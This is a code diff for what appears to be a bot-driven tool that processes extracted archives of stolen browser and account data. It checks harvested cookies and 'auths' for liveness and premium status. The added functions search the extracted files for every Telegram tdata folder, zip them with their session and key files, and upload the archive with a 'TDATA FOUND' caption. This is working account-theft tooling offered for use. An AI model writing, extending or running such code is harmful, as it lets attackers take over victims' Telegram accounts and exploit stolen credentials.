@@ -1047,6 +1047,44 @@ def check_auths(auths):
             "ck_err": len(err_set), "ck_zip": bool(okzip),
             "ck_proxies": len(proxies)}
 
+def find_tdata(root):
+    """Every Telegram tdata folder at any depth (tdata, tdata1, tdata2…)."""
+    out = []
+    for p in root.rglob("*"):
+        try:
+            if not p.is_dir():
+                continue
+        except OSError:
+            continue
+        n = p.name.lower()
+        if n == "tdata" or (n.startswith("tdata") and (len(n) == 5 or n[5:].isdigit())):
+            # skip nested tdata subfolders already covered by a parent hit
+            if not any(a != p and str(p).startswith(str(a) + os.sep) for a in out):
+                out.append(p)
+    return out
+
+def pack_tdata(dirs):
+    """All found folders in ONE tdata.zip under td_1st/, td_2nd/… prefixes."""
+    if not dirs:
+        return None, 0
+    zp = OUT / "tdata.zip"
+    total = 0
+    with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as z:
+        for i, d in enumerate(dirs, 1):
+            pre = "td_%s_%s" % (ordn(i), re.sub(r"[^\w.-]", "_", d.name.lower()))
+            n = 0
+            for f in sorted(d.rglob("*")):
+                try:
+                    if f.is_file():
+                        z.write(f, pre + "/" + str(f.relative_to(d)))
+                        n += 1
+                except Exception:
+                    pass
+            if not n:
+                z.writestr(pre + "/EMPTY", "")
+            total += 1
+    return zp, total
+
 def finish(task, stage, **extra):
     """Terminal state for a job: paint the card, report to the bot, back to idle."""
     st(stage, 100 if stage == "done" else _state.get("pct", 0),
@@ -1055,10 +1093,9 @@ def finish(task, stage, **extra):
     payload = {"job": task.get("job"), "stage": stage, "uid": task.get("chat")}
     payload.update({k: extra[k] for k in extra
                     if k in ("err", "found", "cookies", "tried", "sent", "failed",
-                             "links", "auth", "auth_sent", "auth_fid",
-                             "ck_total", "ck_live", "ck_prem", "ck_free",
-                             "ck_exp", "ck_dead", "ck_err", "ck_zip",
-                             "ck_proxies")})
+                             "links", "auth", "auth_sent", "auth_fid", "td_total",
+                             "td_sent", "ck_total", "ck_live", "ck_prem", "ck_free",
+                             "ck_exp", "ck_dead", "ck_err", "ck_zip", "ck_proxies")})
     payload["pubs"] = PB[3]
     report(payload)
     PB[1] = None
@@ -1100,13 +1137,26 @@ def process(task):
         finish(task, "cancelled", err="cancelled"); return
     sent, failed, links = deliver(packed, task)
     want_auth = bool(task.get("auth"))
+    want_tdata = bool(task.get("tdata"))
     auth_sent, auth_fid = deliver_auth(auths) if want_auth else (False, None)
+    td_zip, td_total = None, 0
+    if want_tdata:
+        td_zip, td_total = pack_tdata(find_tdata(WORK / "ex"))
+    td_sent = False
+    if td_zip:
+        cap = (f"{gold_header('TDATA FOUND', esc('%d folder%s found'
+               % (td_total, '' if td_total == 1 else 's')))}\n{THIN}\n"
+               f"🗃 {bold('Folders')}  {code(td_total)}\n"
+               f"🗂 {bold('Layout')}  one tdata.zip · td_1st_tdata/, td_2nd_tdata/…\n"
+               f"📎 Upload in a moment — sessions, map0 and key files included.")
+        td_sent = upload(str(td_zip), cap)
     ck = check_auths(auths) if (want_auth and task.get("authcheck") and auths) else {}
     shutil.rmtree(WORK, ignore_errors=True)
     st("done", 100, job=task.get("job"), vm=SPECS)
     finish(task, "done", found=packed, cookies=sum(packed.values()), sent=sent,
            failed=failed, links=links, auth=len(auths) if want_auth else 0,
-           auth_sent=auth_sent, auth_fid=auth_fid if want_auth else None, **ck)
+           auth_sent=auth_sent, auth_fid=auth_fid if want_auth else None,
+           td_total=td_total, td_sent=td_sent, **ck)
 
 def main():
     OUT.mkdir(parents=True, exist_ok=True)
